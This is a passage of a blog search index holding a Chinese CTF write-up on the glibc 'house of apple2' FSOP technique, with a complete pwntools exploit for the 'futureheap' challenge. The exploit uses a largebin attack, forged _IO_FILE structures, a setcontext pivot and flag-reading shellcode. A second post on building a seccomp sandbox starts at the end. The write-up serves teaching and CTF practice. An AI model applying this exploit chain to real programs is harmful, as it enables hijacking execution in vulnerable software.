+<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
+</ul>
+<p>由于触发FSOP的<code>_IO_flush_all_lockp</code>函数中有这么一条判断，所以我们要使前两个条件有一个为真，也就是<code>fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> 或 <code>_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</code>，第一个条件比较好满足。</p>
+<pre><code class="c">      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
+       || (_IO_vtable_offset (fp) == 0
+           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr
+                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))
+       )
+      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)
+    result = EOF;
+</code></pre>
+<p>需要注意的是，最后是<code>call qword ptr [rax + 0x68]</code>实现跳转，所以在rax+0x68的位置不能直接是shellcode，而是一个合法的地址。在这里报错时就可以观察寄存器信息，这里rdx实质就指向我们之前伪造的fake_IO_FILE的_wide_data域。</p>
+<img src="/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109200034550.png" class="">
+
+<p>这里setcontext能够把rdx作为一个类sigFrame的指针，然后恢复各字段。然后就能够进行各种操作了，比如进行srop等等。</p>
+<img src="/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109200645735.png" class="">
+
+<p>现在我们来分析一下futureheap这道题</p>
+<img src="/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109221708861.png" class="">
+
+<img src="/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109225750797.png" class="">
+
+<p>首先这个init函数中是经典的伪随机数的利用，可以最终得到libc_base和一个fortune的地址，这个fortune是一个rwx的段，可以写shellcode然后想办法执行。这道题也刚好沙箱禁用了直接的execve调用和一些基本的orw函数。但是我们只要能劫持程序执行流，还是能比较方便的利用系统调用读取flag。</p>
+<img src="/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109230302958.png" class="">
+
+<img src="/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109230106028.png" class="">
+
+<img src="/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109230119254.png" class="">
+
+<img src="/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109230135976.png" class="">
+
+<img src="/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109230148959.png" class="">
+
+<p>还是比较经典的菜单题，主要功能有add，delete和edit。其中delete存在UAF，add只能申请largebin chunk。edit有3次机会，之后会直接调用exit退出。然后还存在一个函数，只要输对密码就能往fortune中写入0x500字节。这个密码的获取是一个简单的换表base64。</p>
+<p>那么我们就可以开始学习house of apple2的利用了，首先就是用largebin attack来把_IO_list_all改成我们一个largebin chunk的地址，然后再在该largebin chunk中伪造IO_FILE结构体。</p>
+<pre><code class="python">add(0,0x528)
+add(1,0x520)
+add(2,0x518)
+delete(0)
+add(3,0x550)
+delete(2)
+log.success(&quot;_io_list_all:&quot;+hex(_IO_list_all))
+edit(0,p64(0)*3+p64(_IO_list_all-0x20))
+</code></pre>
+<p>一开始的largebin attack过程就不过多赘述了，先留一个chunk在largebin里，改掉其bk_nextsize域为<code>tar-0x20</code>，然后再让一个较小的chunk进入到largebin时，就能触发glibc2.31版本以上的改单一地址的largebin attack。到这里我们的_IO_list_all被成功改写成largebin chunk的地址。</p>
+<img src="/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109231242168.png" class="">
+
+<p>然后最关键的就是这个<code>_IO_FILE</code>结构体的构造,由于我们是从数据域开始写，所以一开始的<code>_flags</code>和<code>_IO_read_ptr</code>是无法通过edit控制的。</p>
+<pre><code class="python">fake_IO_FILE  = p64(0)*2
+fake_IO_FILE += p64(1) + p64(2) #_write_base,_write_ptr
+fake_IO_FILE += p64(0)+p64(0) #_IO_buf_base,_IO_buf_end 
+fake_IO_FILE += p64(0)      #_IO_save_base
+fake_IO_FILE += p64(0)      #_IO_backup_base
+fake_IO_FILE += p64(0)*5
+fake_IO_FILE += p64(0)       #_lock
+fake_IO_FILE = fake_IO_FILE.ljust(0x90, b&#39;\x00&#39;)
+fake_IO_FILE += p64(fortune+0x18)    #_wide_data
+fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b&#39;\x00&#39;)
+fake_IO_FILE += p64(0)            # _mode = 0
+fake_IO_FILE += p64(fortune+0x108)       #setcontext-&gt;rsp
+fake_IO_FILE += p64(fortune+0x108)     #setcontext-&gt;rcx
+fake_IO_FILE = fake_IO_FILE.ljust(0xC8, b&#39;\x00&#39;)
+fake_IO_FILE += p64(_IO_wfile_jumps)  # vtable
+fake_IO_FILE = fake_IO_FILE.ljust(0xf8,b&#39;\x00&#39;)
+fake_IO_FILE += p64(fortune+0x100-0x68)
+fake_IO_FILE = fake_IO_FILE.ljust(0x100,b&#39;\x00&#39;)
+fake_IO_FILE += p64(setcontext+61) + shellcode
+
+
+edit(2,fake_IO_FILE)
+
+passwd = &quot;74r0t#C@rd&quot;
+out()
+p.sendline(passwd)
+p.sendline(fake_IO_FILE)
+</code></pre>
+<img src="/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109231530476.png" class="">
+
+<img src="/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109233732611.png" class="">
+
+<p>首先将<code>write_base</code>和<code>write_ptr</code>这两个字段分别置1和2，并且把mode置0是为了满足<code>_IO_flush_all_lockp</code>中一个条件，原理见上文。之后要把vtable指向<code>_IO_wfile_jumps</code>，这是因为虽然在glibc2.24及以上多了一个对虚表地址的检测，使其不能偏离所在段太远，但是我们还是可以利用附近的别的虚表进行利用。这里我们选择触发的是<code>_IO_wfile_jumps</code>的<code>_IO_wfile_overflow</code>。也就是<code>_IO_flush_all_lockp</code>中的<code>_IO_OVERFLOW (fp, EOF)</code>这个。因为多态的设计，虚表的结构都是一样的，所以我们本来是调用正常的overflow虚表函数，这里我们劫持到<code>_IO_wfile_jumps</code>后，我们调用的就是<code>__GI__IO_wfile_overflow</code>。然后其具体函数实现里给了我们可趁之机。</p>
+<img src="/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109232222317.png" class="">
+
+<p>然后就能进入<code>_IO_wfile_overflow</code>中。这里我们_flags字段为0，是能够满足里面的各种条件的。然后最关键的就是伪造的<code>IO_FILE</code>的<code>_wide_data</code>这个字段的赋值，因为我们没有堆的基址，但有一个fortune的地址，所以我们可以把伪造的<code>_wide_data</code>这个结构体放到fortune这个位置处，为了方便我们可以复用原来的伪造到堆上的IO_FILE结构，但是因为要使<code>f-&gt;_wide_data-&gt;_IO_write_base == 0</code>，所以我们进行一定的错位，这里我选择的是把<code>_wide_data</code>弄到<code>fortune+0x18</code>，这个位置去。然后就能满足下面这两个条件</p>
+<blockquote>
+<ul>
+<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>
+<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
+</ul>
+</blockquote>
+<p>之后来看后面的构造，我们要找到一个B的位置，然后控制<code>*(B + 0x68)</code>，这样就能把我们的RIP劫持到目标地址处去了</p>
+<blockquote>
+<ul>
+<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
+<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
+</ul>
+</blockquote>
+<p>也就是如下面这3部分的构造。由于我们最后是call到C这里，所以不能直接执行shellcode。我们可以通过setcontext来将rsp放到目标位置，然后setcontext中间会push一个rcx，所以我们可以连带着rcx设置为目标shellcode位置，最后ret到rcx指向的地址，也就执行了我们事先布置的shellcode了。这里rdx就是我们之前布置的<code>_wide_data</code>的位置，然后我们在不影响原来_IO_FILE利用时，设置对应偏移字段来达成特定寄存器的赋值。</p>
+<pre><code class="python">fake_IO_FILE += p64(fortune+0x100-0x68)
+fake_IO_FILE = fake_IO_FILE.ljust(0x100,b&#39;\x00&#39;)
+fake_IO_FILE += p64(setcontext+61) + shellcode
+</code></pre>
+<img src="/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109235637786.png" class="">
+
+<img src="/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109235847848.png" class="">
+
+<p>exp:</p>
+<pre><code class="python">from pwn import *
+import ctypes
+context(arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)
+context.terminal=[&quot;cmd.exe&quot;,&quot;/c&quot;, &quot;start&quot;, &quot;cmd.exe&quot;, &quot;/c&quot;, &quot;wsl.exe&quot;, &quot;-e&quot;]
+table = &quot;polikujmyhntgbrfvedcwsxqazQWERTYUIOPASDFGHJKLZXCVBNM)!@#$%^&amp;*(+/&quot;
+libc = ctypes.CDLL(&quot;./libc.so.6&quot;)
+def get_addr():
+    return u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))
+p = process(&quot;./pwn&quot;)
+elf = ELF(&quot;./pwn&quot;)
+glibc = ELF(&quot;./libc.so.6&quot;)
+# gdb.attach(p)
+name = b&quot;a&quot;*8 + p32(0x88888888)
+p.sendlineafter(&quot;dear:&quot;,name)
+
+libc.srand(0x88888888)
+wolf = libc.rand()
+sword = libc.rand()
+log.success(&quot;wolf:&quot;+str(wolf)+&quot;  sword:&quot;+str(sword))
+
+p.recvuntil(&quot;Lion is &quot;)
+lion = int(p.recvuntil(&#39;.&#39;)[:-1])
+log.success(&quot;Lion:&quot;+str(lion))
+
+p.recvuntil(&quot;Snake is &quot;)
+snake = int(p.recvuntil(&#39;.&#39;)[:-1])
+log.success(&quot;snake:&quot;+str(snake))
+
+setvbuf_add = lion ^ wolf ^ libc.rand()
+libc_base = setvbuf_add - glibc.sym[&quot;setvbuf&quot;]
+log.success(&quot;libc_base:&quot;+hex(libc_base))
+v0 = snake ^ libc.rand()
+fortune = v0 ^ sword
+log.success(&quot;fortune:&quot;+hex(fortune))
+
+
+open=libc_base+glibc.sym[&#39;open&#39;]
+read=libc_base + glibc.sym[&#39;read&#39;]
+write=libc_base + glibc.sym[&#39;write&#39;]
+stderr=libc_base+glibc.sym[&#39;stderr&#39;]
+_IO_list_all=libc_base+glibc.sym[&#39;_IO_list_all&#39;]
+setcontext=libc_base + glibc.sym[&#39;setcontext&#39;]
+_IO_wfile_jumps =libc_base+glibc.sym[&#39;_IO_wfile_jumps&#39;]
+
+def add(idx,size):
+    p.sendline(&quot;1&quot;)
+    p.sendline(str(idx).encode())
+    p.sendline(str(size).encode())
+
+def delete(idx):
+    p.sendline(&quot;3&quot;)
+    p.sendline(str(idx).encode())
+
+def edit(idx,content):
+    p.sendline(&quot;2&quot;)
+    p.sendline(str(idx).encode())
+    p.sendline(content)
+
+def out():
+    p.sendline(&quot;4&quot;)
+
+
+add(0,0x528)
+add(1,0x520)
+add(2,0x518)
+delete(0)
+add(3,0x550)
+delete(2)
+log.success(&quot;_io_list_all:&quot;+hex(_IO_list_all))
+edit(0,p64(0)*3+p64(_IO_list_all-0x20))
+
+
+add(4,0x600)
+
+
+shellcode=asm(f&#39;&#39;&#39;
+mov rdi,0
+sub rdi,100
+mov rdx,0
+push rdx
+mov rdx,rsp
+mov rsi, 0x67616c662f
+push rsi
+mov rsi,rsp
+add rdx,0x100
+mov r10,0x18
+mov rax,0x1b5
+syscall
+
+mov rdi, 1
+mov rsi, 3
+push 0
+mov rdx, rsp
+mov r10, 0x100
+push SYS_sendfile
+pop rax
+syscall
+&#39;&#39;&#39;)
+
+fake_IO_FILE  = p64(0)*2
+fake_IO_FILE += p64(1) + p64(2) #_write_base,_write_ptr
+fake_IO_FILE += p64(0)+p64(0) #_IO_buf_base,_IO_buf_end 
+fake_IO_FILE += p64(0)      #_IO_save_base
+fake_IO_FILE += p64(0)      #_IO_backup_base
+fake_IO_FILE += p64(0)*5
+fake_IO_FILE += p64(0)       #_lock
+fake_IO_FILE = fake_IO_FILE.ljust(0x90, b&#39;\x00&#39;)
+fake_IO_FILE += p64(fortune+0x18)    #_wide_data
+fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b&#39;\x00&#39;)
+fake_IO_FILE += p64(0)            # _mode = 0
+fake_IO_FILE += p64(fortune+0x108)       #setcontext-&gt;rsp
+fake_IO_FILE += p64(fortune+0x108)     #setcontext-&gt;rcx
+fake_IO_FILE = fake_IO_FILE.ljust(0xC8, b&#39;\x00&#39;)
+fake_IO_FILE += p64(_IO_wfile_jumps)  # vtable
+fake_IO_FILE = fake_IO_FILE.ljust(0xf8,b&#39;\x00&#39;)
+fake_IO_FILE += p64(fortune+0x100-0x68)
+fake_IO_FILE = fake_IO_FILE.ljust(0x100,b&#39;\x00&#39;)
+fake_IO_FILE += p64(setcontext+61) + shellcode
+
+
+edit(2,fake_IO_FILE)
+
+passwd = &quot;74r0t#C@rd&quot;
+out()
+p.sendline(passwd)
+p.sendline(fake_IO_FILE)
+
+gdb.attach(p)
+# p.sendline(b&quot;2&quot;)
+
+p.interactive()
+</code></pre>
+<h5 id="2-IO-wfile-underflow-mmap链"><a href="#2-IO-wfile-underflow-mmap链" class="headerlink" title="2._IO_wfile_underflow_mmap链"></a>2._IO_wfile_underflow_mmap链</h5><p>源码：</p>
+<pre><code class="c">static wint_t
+_IO_wfile_underflow_mmap (FILE *fp)
+&#123;
+  struct _IO_codecvt *cd;
+  const char *read_stop;
+
+  if (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))
+    &#123;
+      fp-&gt;_flags |= _IO_ERR_SEEN;
+      __set_errno (EBADF);
+      return WEOF;
+    &#125;
+  if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)
+    return *fp-&gt;_wide_data-&gt;_IO_read_ptr;
+
+  cd = fp-&gt;_codecvt;
+
+  /* Maybe there is something left in the external buffer.  */
+  if (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end
+      /* No.  But maybe the read buffer is not fully set up.  */
+      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)
+    /* Nothing available.  _IO_file_underflow_mmap has set the EOF or error
+       flags as appropriate.  */
+    return WEOF;
+
+  /* There is more in the external.  Convert it.  */
+  read_stop = (const char *) fp-&gt;_IO_read_ptr;
+
+  if (fp-&gt;_wide_data-&gt;_IO_buf_base == NULL)
+    &#123;
+      /* Maybe we already have a push back pointer.  */
+      if (fp-&gt;_wide_data-&gt;_IO_save_base != NULL)
+    &#123;
+      free (fp-&gt;_wide_data-&gt;_IO_save_base);
+      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;
+    &#125;
+      _IO_wdoallocbuf (fp);
+    &#125;
+
+  fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;
+  fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =
+    fp-&gt;_wide_data-&gt;_IO_buf_base;
+  __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,
+              fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,
+              &amp;read_stop,
+              fp-&gt;_wide_data-&gt;_IO_read_ptr,
+              fp-&gt;_wide_data-&gt;_IO_buf_end,
+              &amp;fp-&gt;_wide_data-&gt;_IO_read_end);
+
+  fp-&gt;_IO_read_ptr = (char *) read_stop;
+
+  /* If we managed to generate some text return the next character.  */
+  if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)
+    return *fp-&gt;_wide_data-&gt;_IO_read_ptr;
+
+  /* There is some garbage at the end of the file.  */
+  __set_errno (EILSEQ);
+  fp-&gt;_flags |= _IO_ERR_SEEN;
+  return WEOF;
+&#125;
+
+int
+_IO_file_underflow_mmap (FILE *fp)
+&#123;
+  if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)
+    return *(unsigned char *) fp-&gt;_IO_read_ptr;
+
+  if (__glibc_unlikely (mmap_remap_check (fp)))
+    /* We punted to the regular file functions.  */
+    return _IO_UNDERFLOW (fp);
+
+  if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)
+    return *(unsigned char *) fp-&gt;_IO_read_ptr;
+
+  fp-&gt;_flags |= _IO_EOF_SEEN;
+  return EOF;
+&#125;
+</code></pre>
+<p>需满足的条件如下</p>
+<pre><code class="c">fp-&gt;_flags &amp; _IO_NO_READS == 0;
+fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end;
+fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end == false;
+fp-&gt;_wide_data-&gt;_IO_buf_base == NULL;
+fp-&gt;_wide_data-&gt;_IO_save_base == NULL;	//也可以不为null，但要执行一次free和flag的设置，最好设置为0
+</code></pre>
+<p>实质上就是进入的点不同，最后利用的链还是相同的。这里如果只是单纯的把虚表从<code>_IO_wfile_jumps</code>改成<code>_IO_wfile_jumps_mmap</code>，实际最后还是会进入overflow那个函数。因为这两个虚表其实是完全相同的，而我们触发的是原来表中overflow那个虚表函数。我们需要添加偏移来进入不同的函数，在本题中，经测试+0x10的偏移能够进入<code>_IO_wdefault_uflow</code>，偏移+0x30能进入<code>_IO_wfile_seekoff</code>，+8偏移能成功进入<code>_IO_wfile_underflow_mmap</code>，其实就是对应原表的偏移。</p>
+<p>构造如下</p>
+<ul>
+<li><code>_flags</code> &#x3D; <code>~4</code></li>
+<li><code>vtable</code> 设置为 <code>_IO_wfile_jumps_mmap</code> 地址（加减偏移）</li>
+<li><code>_IO_read_end &gt; _IO_read_ptr</code>（不进入调用）</li>
+<li><code>_wide_data</code> 设置为可控堆地址 <code>A</code>（即满足<code>*(fp+0xa0)=A</code>）</li>
+<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>（即满足<code>*A&gt;=*(A+8)</code>）</li>
+<li><code>_wide_data-&gt;_IO_buf_base</code> &#x3D; <code>0</code>（即满足<code>*(A+0x30)=0</code>）</li>
+<li><code>_wide_data-&gt;_IO_save_base</code> &#x3D; <code>0</code>（即满足<code>*(A+0x40)=0</code>）</li>
+<li><code>_wide_data-&gt;_wide_vtable</code> &#x3D; 可控堆地址<code>B</code>（即满足<code>*(A+0xe0)=B</code>）</li>
+<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> &#x3D; 地址<code>C</code>，用于劫持 <code>RIP</code>（即满足<code>*(B+0x68)=C</code>）</li>
+</ul>
+<p>但这里rdx进去不是可控地址，看上去是把我们处在第二个字段<code>_IO_read_ptr</code>的largebin chunk size给赋值过来了。这就为setcontext赋值增加了难度，所以这一题不用这个方法。我们能成功的到这一步其实已经算是成功的利用了这条链条。可以尝试call到别的地方打。</p>
+<img src="/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241110011234406.png" class="">
+
+<pre><code class="c">fake_IO_FILE  = p64(0x1000)   #read_end
+fake_IO_FILE += p64(3)          #read_base
+fake_IO_FILE += p64(20) + p64(22) #_write_base,_write_ptr
+fake_IO_FILE += p64(0)+p64(0) #_IO_buf_base,_IO_buf_end 
+fake_IO_FILE += p64(0)      #_IO_save_base
+fake_IO_FILE += p64(0)      #_IO_backup_base
+fake_IO_FILE += p64(0)      #_IO_save_end
+fake_IO_FILE += p64(0)*4
+fake_IO_FILE += p64(0)       #_lock
+fake_IO_FILE = fake_IO_FILE.ljust(0x90, b&#39;\x00&#39;)
+fake_IO_FILE += p64(fortune+0x18)    #_wide_data
+fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b&#39;\x00&#39;)
+fake_IO_FILE += p64(0)            # _mode = 0
+fake_IO_FILE += p64(fortune+0x108)       #setcontext-&gt;rsp
+fake_IO_FILE += p64(fortune+0x108)     #setcontext-&gt;rcx
+fake_IO_FILE = fake_IO_FILE.ljust(0xC8, b&#39;\x00&#39;)
+fake_IO_FILE += p64(_IO_wfile_jumps_mmap+0x8)  # vtable
+fake_IO_FILE = fake_IO_FILE.ljust(0xf8,b&#39;\x00&#39;)
+fake_IO_FILE += p64(fortune+0x100-0x68)
+fake_IO_FILE = fake_IO_FILE.ljust(0x100,b&#39;\x00&#39;)
+fake_IO_FILE += p64(setcontext+61) + shellcode
+</code></pre>
+<h5 id="3-IO-wdefault-xsgetn链"><a href="#3-IO-wdefault-xsgetn链" class="headerlink" title="3. _IO_wdefault_xsgetn链"></a>3. _IO_wdefault_xsgetn链</h5><p>源码：</p>
+<pre><code class="c">#define _IO_in_put_mode(_fp) ((_fp)-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)
+
+size_t
+_IO_wdefault_xsgetn (FILE *fp, void *data, size_t n)
+&#123;
+  size_t more = n;
+  wchar_t *s = (wchar_t*) data;
+  for (;;)
+    &#123;
+      /* Data available. */
+      ssize_t count = (fp-&gt;_wide_data-&gt;_IO_read_end
+                       - fp-&gt;_wide_data-&gt;_IO_read_ptr);
+      if (count &gt; 0)
+    &#123;
+      if ((size_t) count &gt; more)
+        count = more;
+      if (count &gt; 20)
+        &#123;
+          s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);
+          fp-&gt;_wide_data-&gt;_IO_read_ptr += count;
+        &#125;
+      else if (count &lt;= 0)
+        count = 0;
+      else
+        &#123;
+          wchar_t *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;
+          int i = (int) count;
+          while (--i &gt;= 0)
+        *s++ = *p++;
+          fp-&gt;_wide_data-&gt;_IO_read_ptr = p;
+            &#125;
+            more -= count;
+    &#125;
+    if (more == 0 || __wunderflow (fp) == WEOF)
+        break;
+    &#125;
+  return n - more;
+&#125;
+
+wint_t
+__wunderflow (FILE *fp)
+&#123;
+  if (fp-&gt;_mode &lt; 0 || (fp-&gt;_mode == 0 &amp;&amp; _IO_fwide (fp, 1) != 1))
+    return WEOF;
+
+  if (fp-&gt;_mode == 0)
+    _IO_fwide (fp, 1);
+  if (_IO_in_put_mode (fp))
+    if (_IO_switch_to_wget_mode (fp) == EOF)
+      return WEOF;
+  if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)
+    return *fp-&gt;_wide_data-&gt;_IO_read_ptr;
+  if (_IO_in_backup (fp))
+    &#123;
+      _IO_switch_to_main_wget_area (fp);
+      if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)
+    return *fp-&gt;_wide_data-&gt;_IO_read_ptr;
+    &#125;
+  if (_IO_have_markers (fp))
+    &#123;
+      if (save_for_wbackup (fp, fp-&gt;_wide_data-&gt;_IO_read_end))
+    return WEOF;
+    &#125;
+  else if (_IO_have_backup (fp))
+    _IO_free_wbackup_area (fp);
+  return _IO_UNDERFLOW (fp);
+&#125;
+
+int
+_IO_switch_to_wget_mode (FILE *fp)
+&#123;
+  if (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)
+    if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF)
+      return EOF;
+  if (_IO_in_backup (fp))
+    fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_backup_base;
+  else
+    &#123;
+      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_buf_base;
+      if (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_read_end)
+    fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_write_ptr;
+    &#125;
+  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_write_ptr;
+
+  fp-&gt;_wide_data-&gt;_IO_write_base = fp-&gt;_wide_data-&gt;_IO_write_ptr
+    = fp-&gt;_wide_data-&gt;_IO_write_end = fp-&gt;_wide_data-&gt;_IO_read_ptr;
+
+  fp-&gt;_flags &amp;= ~_IO_CURRENTLY_PUTTING;
+  return 0;
+&#125;
+</code></pre>
+<p>目的是进到<code>__wunderflow (fp)</code>中<code>_IO_switch_to_wget_mode</code>里的<code>(wint_t)_IO_WOVERFLOW (fp, WEOF)</code>这个虚表函数调用。</p>
+<p>需要满足条件如下</p>
+<pre><code class="c">fp-&gt;_wide_data-&gt;_IO_read_end == fp-&gt;_wide_data-&gt;_IO_read_ptr;	//可以绕过前面一些麻烦的操作，直奔__wunderflow
+(fp-&gt;_mode &lt; 0 || (fp-&gt;_mode == 0 &amp;&amp; _IO_fwide (fp, 1) != 1)) == false;	//mode设置为1即可
+_IO_in_put_mode (fp)!=0;	//即fp-&gt;flags &amp; 0x800 != 0
+fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base;
+</code></pre>
+<p>构造如下</p>
+<ul>
+<li><code>_flags</code> &#x3D; <code>0x800</code></li>
+<li><code>vtable</code> &#x3D; <code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code> 地址（加减偏移）</li>
+<li><code>_mode</code> &gt; <code>0</code>（即满足<code>*(fp+0xc0)&gt;0</code>）</li>
+<li><code>_wide_data</code> &#x3D; 可控堆地址<code>A</code>（即满足<code>*(fp+0xa0)=A</code>）</li>
+<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code> （即满足 <code>*(A+8)=*A</code>）</li>
+<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>（即满足<code>*(A+0x20)&gt;*(A+0x18)</code>）</li>
+<li><code>_wide_data-&gt;_wide_vtable</code> &#x3D; 可控堆地址<code>B</code>（即满足<code>*(A+0xe0)=B</code>）</li>
+<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code> &#x3D; 地址<code>C</code>，用于劫持<code>RIP</code>（即满足<code>*(B+0x18)=C</code>）</li>
+</ul>
+<p>很可惜的是futureheap这道题只能申请0x700大小以下的堆块，而用largebin attack改的_IO_list_all后，第一个<code>_IO_FILE</code>结构体的<code>_flags</code>字段实质上就被赋值为largebin chunk的大小。我们就无法使<code>_IO_in_put_mode (fp)!=0</code>这个条件成立，所以本题也不好使用这一条链条。</p>
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>在示例题目中，上面3种方法只有第一种方式比较方便题解，这说明了几个链条的适用条件都有所不同，可以根据具体情况选择不同的链条进行尝试。本质还是<code>_IO_flush_all_lockp</code>这个FSOP的利用。</p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>heap</tag>
+        <tag>house of</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>self-made sandbox</title>
+    <url>/2024/09/21/self-made-sandbox/</url>
+    <content><![CDATA[<p>由于最近要打几场awd，一个一个漏洞改过来感觉有点麻烦，所以想到了上沙箱，但是一般好像比赛会禁止上通防，这里想试试看自己通过系统调用写一个沙箱出来，看看能不能瞒天过海。</p>
+<h3 id="一、c代码实现沙箱"><a href="#一、c代码实现沙箱" class="headerlink" title="一、c代码实现沙箱"></a>一、c代码实现沙箱</h3><p>不是很清楚沙箱具体用到的系统调用，所以先让gpt生成了一段正常用c语言实现的沙箱代码。</p>
+<pre><code class="c">//test.c
+//gcc -g test.c -o test
+#include &lt;linux/seccomp.h&gt;
+#include &lt;linux/filter.h&gt;
+#include &lt;sys/prctl.h&gt;
+#include &lt;stddef.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+void install_seccomp() &#123;
+    struct sock_filter filter[] = &#123;
+        // 读取系统调用号
+        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
+        
+        // 检查是否为 execve 系统调用（编号 59）
+        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 59, 0, 1), 
+        
+        // 如果是 execve，则杀死进程
